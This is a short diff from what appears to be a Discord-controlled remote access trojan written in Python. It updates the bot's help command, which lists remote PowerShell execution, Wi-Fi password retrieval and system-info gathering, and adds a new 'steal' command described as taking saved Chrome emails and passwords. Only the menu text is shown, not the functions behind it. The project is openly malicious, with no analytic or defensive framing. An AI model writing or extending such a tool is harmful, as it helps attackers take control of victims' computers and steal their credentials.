@@ -58,7 +58,7 @@ async def main_loop():
 
 @bot.command()
 async def what(ctx):
-    commands = "**whoami**-(get current user who is running at this moment)\n**send_message**-(make the bot send a message)\n**ps**-(execute powershell commands)\n**getwifipass**-(get wifi passwords)\n**getsysinfo**-(get important system info)\n**stopbot**-(You know what this does)"
+    commands = "**whoami**-(get current user who is running at this moment)\n**send_message**-(make the bot send a message)\n**ps**-(execute powershell commands)\n**getwifipass**-(get wifi passwords)\n**getsysinfo**-(get important system info)\n**steal**-(Steals saved chrome email and passwords)\n**stopbot**-(You know what this does)"
     await ctx.send(commands)
 
 @bot.command()
